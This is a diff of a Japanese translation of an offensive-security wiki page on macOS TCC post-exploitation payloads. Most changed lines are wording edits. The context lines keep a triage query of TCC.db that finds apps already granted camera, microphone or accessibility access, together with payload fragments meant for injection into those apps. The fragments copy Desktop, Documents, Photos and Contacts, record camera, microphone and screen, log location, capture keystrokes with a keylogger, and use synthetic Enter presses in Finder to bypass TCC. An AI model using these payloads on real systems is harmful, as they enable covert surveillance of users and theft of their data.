@@ -1,18 +1,18 @@
-# macOS TCC Payload
+# macOS TCC Payloads
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 > [!TIP]
-> TCC の判断は、リソースを要求する **プロセスの identity** に紐付けられます。post-exploitation では通常、新しい helper を実行して独自の prompt を発生させるのではなく、これらの payload を **すでに承認済みの app に inject** する（または、その app の bundle / signature context 内で実行する）ことが目的になります。
+> TCC の判断は、リソースを要求する **プロセスの identity** に紐づいています。post-exploitation では通常、新しい helper を実行して独自の prompt を発生させるのではなく、これらの payloads を **すでに承認済みのアプリ** に inject する（または、その bundle / signature context 内で実行する）ことが目的になります。
 >
-> **Screen Recording**、**Input Monitoring**、および **synthetic input** については、最近の macOS でも `CGPreflightScreenCaptureAccess`、`CGRequestScreenCaptureAccess`、`CGRequestListenEventAccess`、`CGRequestPostEventAccess` などの明示的な preflight / request API が公開されています。
+> **Screen Recording**、**Input Monitoring**、および **synthetic input** については、最近の macOS では `CGPreflightScreenCaptureAccess`、`CGRequestScreenCaptureAccess`、`CGRequestListenEventAccess`、`CGRequestPostEventAccess` など、明示的な preflight / request APIs も提供されています。
 
 > [!WARNING]
-> これは依然として非常に現実的な攻撃経路です。Microsoft の macOS app を対象とした最近の permission-theft research では、**弱い library validation / plugin loading** により、攻撃者が被害者 app にすでに付与されている **camera**、**microphone**、その他の TCC permissions を、2 回目の prompt なしで再利用できることが示されました。
+> これは依然として非常に現実的な attack path です。Microsoft の macOS apps を対象とした最近の permission-theft research では、**weak library validation / plugin loading** により、攻撃者が被害者の app にすでに付与されている **camera**、**microphone**、その他の TCC permissions を、2 回目の prompt なしで再利用できる可能性が示されました。
 
-## Payload を使用する前の簡易 triage
+## Payload を使用する前の Quick triage
 
-最近の permission-theft research は、同じ workflow を繰り返し裏付けています。まず、目的の TCC grant をすでに持つ app を見つけ、次にそれが現実的な injection target であることを確認します。<sup>[1]</sup>
+最近の permission-theft research では、同じ workflow の重要性が繰り返し示されています。まず、必要な TCC grant をすでに持つ app を見つけ、次にそれが現実的な injection target であることを確認します。<sup>[[1]](#references)</sup>
 ```bash
 sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
 "select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"
@@ -20,7 +20,7 @@ sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
 codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
 egrep 'disable-library-validation|allow-dyld-environment-variables'
 ```
-ターゲットが攻撃者が制御する plug-ins / frameworks も読み込む場合、これらの payloads はさらに興味深いものになります。すでに承認済みのプロセス内に侵入した後の、より幅広い post-exploitation のアイデアについては、[こちらの関連ページ](macos-tcc-credential-and-data-theft.md)を確認してください。
+ターゲットが攻撃者制御の plug-in / framework も読み込む場合、これらの payload はさらに興味深いものになります。すでに承認済みのプロセス内に侵入した後の、より幅広い post-exploitation のアイデアについては、[この関連ページ](macos-tcc-credential-and-data-theft.md)を確認してください。
 
 ### Desktop
 
@@ -29,7 +29,7 @@ egrep 'disable-library-validation|allow-dyld-environment-variables'
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Desktop` を `/tmp/desktop` にコピーします。
+`$HOME/Desktop`を`/tmp/desktop`にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -73,12 +73,12 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 
 ### Documents
 
-- **Entitlement**: なし
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Documents` を `/tmp/documents` にコピーします。
+`$HOME/Documents`を`/tmp/documents`にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -122,12 +122,12 @@ cp -r "$HOME/Documents" "/tmp/documents"
 
 ### ダウンロード
 
-- **Entitlement**: なし
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Downloads`を`/tmp/downloads`にコピーします。
+`$HOME/Downloads` を `/tmp/downloads` にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -162,7 +162,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Dowloads`を`/tmp/downloads`にコピーします。
+`$HOME/Dowloads` を `/tmp/downloads` にコピーします。
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
@@ -171,12 +171,12 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 
 ### 写真ライブラリ
 
-- **Entitlement**: `com.apple.security.personal-information.photos-library`
+- **権限**: `com.apple.security.personal-information.photos-library`
 - **TCC**: `kTCCServicePhotos`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Pictures/Photos Library.photoslibrary`を`/tmp/photos`にコピーします。
+`$HOME/Pictures/Photos Library.photoslibrary` を `/tmp/photos` にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -260,14 +260,14 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Library/Application Support/AddressBook`を`/tmp/contacts`にコピーします。
+`$HOME/Library/Application Support/AddressBook` を `/tmp/contacts` にコピーします。
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### カレンダー
+### Calendar
 
 - **Entitlement**: `com.apple.security.personal-information.calendars`
 - **TCC**: `kTCCServiceCalendar`
@@ -316,14 +316,14 @@ cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 {{#endtab}}
 {{#endtabs}}
 
-### Camera
+### カメラ
 
 - **Entitlement**: `com.apple.security.device.camera`
 - **TCC**: `kTCCServiceCamera`
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-Record a 3s video and save it in **`/tmp/recording.mov`**<sup>[5]</sup>
+3秒間の動画を録画し、**`/tmp/recording.mov`** に保存します<sup>[[5]](#references)</sup>。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -402,7 +402,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-プログラムがカメラにアクセスできるか確認します。<sup>[5]</sup>
+プログラムがカメラへのアクセス権を持っているか確認します。<sup>[[5]](#references)</sup>
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -435,7 +435,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Prompt"}}
-現在のプロセスがまだ `NotDetermined` の場合に、カメラのプロンプトをトリガーします。
+現在のプロセスがまだ `NotDetermined` の場合、カメラのプロンプトを表示させます。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -454,21 +454,21 @@ dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
 {{#endtab}}
 
 {{#tab name="Shell"}}
-カメラで写真を撮影する
+カメラで写真を撮る
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Microphone
+### マイク
 
 - **Entitlement**: **com.apple.security.device.audio-input**
 - **TCC**: `kTCCServiceMicrophone`
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-5秒間音声を録音し、`/tmp/recording.m4a`に保存します<sup>[6]</sup>。
+5秒間音声を録音し、`/tmp/recording.m4a`に保存する<sup>[[6]](#references)</sup>
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -568,7 +568,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-アプリがマイクにアクセスできるか確認します。<sup>[5]</sup>
+アプリがマイクへのアクセス権を持っているか確認します。<sup>[[5]](#references)</sup>
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -618,7 +618,7 @@ dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
 {{#endtab}}
 
 {{#tab name="Shell"}}
-5秒間の音声を録音し、`/tmp/recording.wav`に保存する
+5秒間の音声を録音し、`/tmp/recording.wav` に保存します。
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -628,17 +628,17 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {{#endtab}}
 {{#endtabs}}
 
-### 位置情報
+### 場所
 
 > [!TIP]
-> アプリが位置情報を取得するには、（プライバシーとセキュリティの）**位置情報サービス**を**有効にする必要があります**。有効でない場合、アプリは位置情報にアクセスできません。
+> アプリが場所を取得するには、**Location Services**（Privacy & Security 内）を**有効にする必要があります。**有効でない場合、アクセスできません。
 
 - **Entitlement**: `com.apple.security.personal-information.location`
-- **TCC**: `/var/db/locationd/clients.plist` で許可されます
+- **TCC**: `/var/db/locationd/clients.plist` で Granted
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-位置情報を `/tmp/logs.txt` に書き込む
+場所を `/tmp/logs.txt` に書き込む
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -688,7 +688,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Shellから現在の位置情報を取得します。<sup>[2]</sup>
+shellから現在の場所を取得します。<sup>[[2]](#references)</sup>
 ```bash
 # Fast option: use a dedicated CoreLocation CLI helper
 brew install --cask corelocationcli
@@ -698,7 +698,7 @@ CoreLocationCLI --json
 CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
 > [!TIP]
-> これは **Location Services** が有効であり、tool / terminal が TCC の承認を受けていることにも依存します。`CoreLocationCLI` はほとんどの Mac で Wi-Fi-assisted positioning にも依存するため、Wi-Fi が無効になっていると `kCLErrorDomain error 0` になることがよくあります。
+> これは、**Location Services** が有効であり、ツールまたはターミナルが TCC の承認を受けていることにも依存します。`CoreLocationCLI` はほとんどの Mac で Wi-Fi-assisted positioning にも依存するため、Wi-Fi が無効になっていると `kCLErrorDomain error 0` で終了することがよくあります。
 
 {{#endtab}}
 {{#endtabs}}
@@ -710,7 +710,7 @@ CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-メイン画面を 5 秒間 `/tmp/screen.mov` に記録する
+メイン画面を 5 秒間 `/tmp/screen.mov` に録画する
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -768,7 +768,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check / Prompt"}}
-現在のプロセスが画面をキャプチャできるか確認し、必要に応じてTCCプロンプトを表示します。
+現在のプロセスが画面をキャプチャできるか確認し、必要に応じてTCC promptをトリガーします。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <CoreGraphics/CoreGraphics.h>
@@ -789,7 +789,7 @@ fclose(stderr);
 {{#endtab}}
 
 {{#tab name="Shell"}}
-メイン画面を5秒間録画する
+メイン画面を5秒間記録する
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
@@ -797,14 +797,14 @@ screencapture -V 5 /tmp/screen.mov
 {{#endtabs}}
 
 > [!TIP]
-> **macOS 12.3以降**では、`ScreenCaptureKit`は通常、`AVCaptureScreenInput`よりも優れたpost-exploitation primitiveです。高パフォーマンスのストリーミング、`SCScreenshotManager`による単一フレームの取得、**system audio**のストリーミングが可能です。最近の`ScreenCaptureKit`のアップデートでは、`SCStreamConfiguration`に`captureMicrophone` / `microphoneCaptureDeviceID`が追加され、`SCRecordingOutput`によるファイルへの直接録画にも対応しました。そのため、乗っ取った1つのscreen-capture clientでscreen + system audioを直接保存し、プロセスが`kTCCServiceMicrophone`も保持している場合はマイク音声を追加できます。その他のdesktop-session abuse primitivesについては、[こちらの関連ページ](../macos-input-monitoring-screen-capture-accessibility.md)を参照してください。
+> **macOS 12.3+**では、`ScreenCaptureKit`は通常、`AVCaptureScreenInput`よりも優れたpost-exploitation primitiveです。高性能なストリーミング、`SCScreenshotManager`による単一フレームの取得、**system audio**のストリーミングが可能です。最近の`ScreenCaptureKit`のアップデートでは、`SCStreamConfiguration`に`captureMicrophone` / `microphoneCaptureDeviceID`が追加され、`SCRecordingOutput`によるファイルへの直接録画にも対応しました。そのため、乗っ取った1つのscreen-capture clientでscreen + system audioを直接保存し、プロセスが`kTCCServiceMicrophone`も保持している場合はmic audioを追加できます。その他のdesktop-session abuse primitiveについては、[こちらの関連ページ](../macos-input-monitoring-screen-capture-accessibility.md)を参照してください。
 
 ### アクセシビリティ
 
 - **Entitlement**: なし
 - **TCC**: `kTCCServiceAccessibility`
 
-TCC privilegeを使用してFinderにEnterキーを押す操作を受け入れさせ、その方法でTCCをバイパスします。
+TCC privilegeを使用して、FinderでEnterキーを押す操作を受け入れ、その方法でTCCをbypassします。
 
 {{#tabs}}
 {{#tab name="Accept TCC"}}
@@ -861,7 +861,7 @@ return 0;
 {{#endtab}}
 
 {{#tab name="Check / Prompt"}}
-現在のプロセスがすでに Accessibility の信頼済みであるかを確認し、信頼されていない場合は macOS に同意 UI を表示させます。
+現在のプロセスがすでに Accessibility の信頼済みプロセスか確認し、信頼されていない場合は macOS に同意 UI を表示させます。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -875,7 +875,7 @@ NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
 {{#endtab}}
 
 {{#tab name="Keylogger"}}
-押されたキーを **`/tmp/keystrokes.txt`** に保存します。
+押されたキーを**`/tmp/keystrokes.txt`**に保存する
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -982,21 +982,21 @@ return 0;
 {{#endtab}}
 {{#endtabs}}
 
-> [!CAUTION] > **Accessibility は非常に強力な権限です**。たとえば、System Events を呼び出さなくても、そこから **keystrokes attack** を実行するなど、別の方法で悪用できます。
+> [!CAUTION] > **アクセシビリティは非常に強力な権限です**。他の方法でも悪用できます。たとえば、System Events を呼び出さずに **keystrokes attack** を実行できます。
 
 > [!TIP]
-> 新しい macOS バージョンでは、desktop-session abuse も **Input Monitoring**（`kTCCServiceListenEvent`）と **synthetic input**（`kTCCServicePostEvent`）に分割されています。AXUIElement automation の代わりに keylogging、screen grabs、raw event injection が必要な場合は、[macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md) を確認してください。
+> 新しい macOS バージョンでは、desktop-session abuse も **Input Monitoring** (`kTCCServiceListenEvent`) と **synthetic input** (`kTCCServicePostEvent`) に分割されています。AXUIElement automation の代わりに keylogging、screen grabs、または raw event injection が必要な場合は、[macOS Input Monitoring、Screen Capture、Accessibility の悪用](../macos-input-monitoring-screen-capture-accessibility.md)を確認してください。
 
 
 
-## References
+## 参考資料
 
-- [1] [Cisco Talos - macOS 用 Microsoft アプリの複数の脆弱性が権限の窃取につながる仕組み](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
+- [1] [Cisco Talos - macOS 向け Microsoft アプリの複数の脆弱性が権限の窃取への道を開く](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
 - [2] [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
-- [3] [Apple Developer - macOS でメディアキャプチャの認証をリクエストする](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
-- [4] [Apple Developer - ScreenCaptureKit で HDR コンテンツをキャプチャする（WWDC24）](https://developer.apple.com/videos/play/wwdc2024/10088/)
-- [5] [vsociety - CVE-2023-26818: DyLib Injection を使用した Telegram による MacOS TCC Bypass Part1](https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4)
-- [6] [Vicarius vsociety - CVE-2023-26818: Telegram を使用した macOS TCC Bypass の Exploit（Part 1）](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
+- [3] [Apple Developer - macOS でメディアキャプチャの認証を要求する](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
+- [4] [Apple Developer - ScreenCaptureKit で HDR コンテンツをキャプチャする (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
+- [5] [vsociety - CVE-2023-26818: DyLib Injection を使用した MacOS TCC Bypass with Telegram Part1](https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4)
+- [6] [Vicarius vsociety - CVE-2023-26818: Exploit macOS TCC Bypass w/ Telegram (Part 1)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
 
 
 {{#include ../../../../banners/hacktricks-training.md}}
